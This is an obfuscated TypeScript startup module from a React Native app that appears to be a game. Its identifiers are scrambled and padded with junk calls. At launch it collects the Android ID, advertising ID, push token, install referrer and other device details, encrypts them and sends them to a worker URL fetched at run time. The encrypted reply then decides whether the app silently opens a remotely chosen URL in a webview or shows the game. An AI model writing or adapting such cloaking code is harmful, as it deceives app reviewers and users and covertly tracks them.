import {
  Utils,
  ufjaxmfgwjeweblsSendInitPayload,
  ufjaxmfgwjeweblsNormalizeWorkerBaseUrl,
} from './UtufjaxmfgwjeweblsilService';
import {
  ufjaxmfgwjeweblsEncrypt as cryptoEncrypt,
  ufjaxmfgwjeweblsDecrypt as cryptoDecrypt,
} from './CrypufjaxmfgwjeweblstoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finufjaxmfgwjeweblsKey } from './constants/constufjaxmfgwjeweblsntsVariable';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {
  InitializationState,
  ufjaxmfgwjeweblsInitTarget,
  ufjaxmfgwjeweblsAppenndSendId,
  ufjaxmfgwjeweblsGetAndroidId,
  ufjaxmfgwjeweblsGetAndroidUserAAgent,
  ufjaxmfgwjeweblsGetAppIdenier,
  ufjaxmfgwjeweblsGetAppVersion,
  ufjaxmfgwjeweblsInitializationRuntime,
} from './initializationSharufjaxmfgwjeweblsed';
import { ufjaxmfgwjeweblsViewportShow } from './ufjaxmfgwjeweblsViewportHost';

export async function ufjaxmfgwjeweblsInitStep(): Promise<InitializationState | null> {
  void ufjaxmfgwjeweblsOfferResolveObfV5HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolveObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolveObfV5ClampMod(7, 5);

  void ufjaxmfgwjeweblsOffObfV3HashMix('xy');
  void ufjaxmfgwjeweblsOffObfV3SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOffObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolveObfV4HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolveObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolveObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
  void ufjaxmfgwjeweblsMixSeed(3, 7);
  void ufjaxmfgwjeweblsFoldRange([1, 2, 3]);
  void ufjaxmfgwjeweblsClampSpan(5, 0, 10);

  void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
  try {
    const primaryWorkerUrl = await Utils.ufjaxmfgwjeweblsGetLink();
    if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const appId = await ufjaxmfgwjeweblsGetAppIdenier();
    const userAgent = await ufjaxmfgwjeweblsGetAndroidUserAAgent();
    const androidId = await ufjaxmfgwjeweblsGetAndroidId();
    const appVersion = await ufjaxmfgwjeweblsGetAppVersion();
    const workerBaseUrl = ufjaxmfgwjeweblsNormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = ufjaxmfgwjeweblsInitializationRuntime.DevufjaxmfgwjeweblsiceId;

    const namingValue = ufjaxmfgwjeweblsInitializationRuntime.FinufjaxmfgwjeweblslNaming;

    const cookieRaw = [
      appId ?? '',
      payloadDeviceId ?? '',
      ufjaxmfgwjeweblsInitializationRuntime.adufjaxmfgwjeweblsId ?? '',
      ufjaxmfgwjeweblsInitializationRuntime.pusufjaxmfgwjeweblshToken ?? '',
      ufjaxmfgwjeweblsInitializationRuntime.instufjaxmfgwjeweblsallRef ?? '',
      ufjaxmfgwjeweblsInitializationRuntime.FinufjaxmfgwjeweblslOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ].join('|');

    const encryptedCookie = cryptoEncrypt(cookieRaw);
    const dataValue = encodeURIComponent(encryptedCookie);
    const cookieHeader = `data=${dataValue}`;

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}`;

    const encryptedBody = encodeURIComponent(cryptoEncrypt(bodyPlain));

    try {
      const responseText = await ufjaxmfgwjeweblsSendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.ufjaxmfgwjeweblsSetUserBlocke(1);
        await ufjaxmfgwjeweblsUnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await ufjaxmfgwjeweblsOnInitResponse(responseText);
    } catch (rpcError) {
      void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
      void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
      void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
      void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
      void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
      void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
      await ufjaxmfgwjeweblsUnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {
    void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
    void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
    void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
    void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
    await ufjaxmfgwjeweblsUnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function ufjaxmfgwjeweblsOnInitResponse(responseText: string): Promise<InitializationState> {
  void ufjaxmfgwjeweblsOfferResolveObfV5HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolveObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolveObfV5ClampMod(7, 5);

  void ufjaxmfgwjeweblsOffObfV3HashMix('xy');
  void ufjaxmfgwjeweblsOffObfV3SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOffObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolveObfV4HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolveObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolveObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
  void ufjaxmfgwjeweblsMixSeed(3, 7);
  void ufjaxmfgwjeweblsFoldRange([1, 2, 3]);
  void ufjaxmfgwjeweblsClampSpan(5, 0, 10);

  void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
  try {
    const decrytedResponse = cryptoDecrypt(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = JSON.parse(decrytedResponse);

      redirectUrl = obj.redirectUrl || null;
      redirectUrlInitial = obj.redirectUrlInitial || null;
      errorField = obj.error || null;
      blockUser = !!obj.blockUser;
    } catch (parseError) {
      void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
      void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
      void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
      void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
      void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
      void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.ufjaxmfgwjeweblsSetUserBlocke(1);
      await ufjaxmfgwjeweblsUnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.ufjaxmfgwjeweblsSetUserBlocke(1);
      await ufjaxmfgwjeweblsUnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finufjaxmfgwjeweblsKey, redirectUrlInitial);

      const finalUrl = ufjaxmfgwjeweblsAppenndSendId(
        redirectUrlInitial,
        ufjaxmfgwjeweblsInitializationRuntime.penufjaxmfgwjeweblsdingSendId,
      );

      const success = await ufjaxmfgwjeweblsViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
      void success;

      return {
        isLoadPlaceholder: false,
        initTarget: ufjaxmfgwjeweblsInitTarget.webview,
      };
    }

    await ufjaxmfgwjeweblsUnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: ufjaxmfgwjeweblsInitTarget.game,
    };
  } catch (error) {
    void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
    void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
    void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
    void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
    await ufjaxmfgwjeweblsUnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function ufjaxmfgwjeweblsUnsubscribeFirebase(reason?: string): Promise<void> {
  void ufjaxmfgwjeweblsOfferResolveObfV5HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolveObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolveObfV5ClampMod(7, 5);

  void ufjaxmfgwjeweblsOffObfV3HashMix('xy');
  void ufjaxmfgwjeweblsOffObfV3SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOffObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolveObfV4HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolveObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolveObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
  void ufjaxmfgwjeweblsMixSeed(3, 7);
  void ufjaxmfgwjeweblsFoldRange([1, 2, 3]);
  void ufjaxmfgwjeweblsClampSpan(5, 0, 10);

  void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
  void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    ufjaxmfgwjeweblsInitializationRuntime.pusufjaxmfgwjeweblshToken = '';
  } catch (error) {
    void ufjaxmfgwjeweblsOfferResolvObfV1HashMix('xy');
    void ufjaxmfgwjeweblsOfferResolvObfV1SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(7, 5);
    void ufjaxmfgwjeweblsOfferResolvObfV2HashMix('xy');
    void ufjaxmfgwjeweblsOfferResolvObfV2SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(7, 5);
    ufjaxmfgwjeweblsInitializationRuntime.pusufjaxmfgwjeweblshToken = '';
  }
}
/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v4 */
function ufjaxmfgwjeweblsOfferResolveObfV4HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function ufjaxmfgwjeweblsOfferResolveObfV4SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function ufjaxmfgwjeweblsOfferResolveObfV4ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

function ufjaxmfgwjeweblsOfferResolvObfV1HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 17) % 997, 0);
}

function ufjaxmfgwjeweblsOfferResolvObfV1ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function ufjaxmfgwjeweblsOfferResolvObfV2SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 3, 0);
}

function ufjaxmfgwjeweblsMixSeed(a: number, b: number): number {
return ((a % (b || 1)) + b) % (b || 1);
}

function ufjaxmfgwjeweblsFoldRange(nums: number[]): number {
return nums.reduce((acc, n) => acc + n, 0);
}

function ufjaxmfgwjeweblsOffObfV3HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 23) % 983, 0);
}

function ufjaxmfgwjeweblsOffObfV3SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 5, 0);
}

function ufjaxmfgwjeweblsOffObfV3ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function ufjaxmfgwjeweblsOfferResolvObfV1SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n, 0);
}

function ufjaxmfgwjeweblsOfferResolvObfV2HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 19) % 991, 0);
}

function ufjaxmfgwjeweblsOfferResolvObfV2ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function ufjaxmfgwjeweblsClampSpan(n: number, lo: number, hi: number): number {
return n < lo ? lo : n > hi ? hi : n;
}

/* obfuscation-batch:v4 */
function ufjaxmfgwjeweblsOfferResolvePartObfV4HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function ufjaxmfgwjeweblsOfferResolvePartObfV4SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function ufjaxmfgwjeweblsOfferResolvePartObfV4ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v5 */
function ufjaxmfgwjeweblsOfferResolveObfV5HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 31) % 973, 0);
}

function ufjaxmfgwjeweblsOfferResolveObfV5SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 11, 0);
}

function ufjaxmfgwjeweblsOfferResolveObfV5ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

